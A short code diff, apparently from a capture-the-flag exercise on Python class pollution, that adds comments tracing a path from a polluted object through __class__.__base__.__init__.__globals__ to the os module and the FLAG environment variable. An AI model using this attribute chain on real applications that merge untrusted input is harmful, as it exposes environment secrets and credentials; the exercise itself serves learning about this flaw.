@@ -39,6 +39,14 @@ merge(injection, abc)
 
 # change here
 print(abc.__class__)
+#print(dir(abc)) => ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'target1', 'target2', 'target3']
+# print(abc.__class__.__base__.__init__.__name__)
+# print(dir(abc.__class__.__base__.__init__)) # We navigate to a function attribute (Any function really) to access the __globals__ attribute
+#  abc.__class__.__base__.__init__.__globals__ returns a big dictionary
+# it contains all functions (merge, save_feedback_to_disk), classes (json etc) and modules as attribute of the namespace the class defintion is in
+# print(abc.__class__.__base__.__init__.__globals__.keys()) #dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__path__', '__file__', '__cached__', '__builtins__', 'utils', 'os', 'glob', 'time', 'merge', 'save_feedback_to_disk', 'json', 'Person', 'User'])
+# Since we want to access os module, we will get os from __globals__
+# print(abc.__class__.__base__.__init__.__globals__.get('os').environ['FLAG']) #false
 # end of change
 
 print(abc)
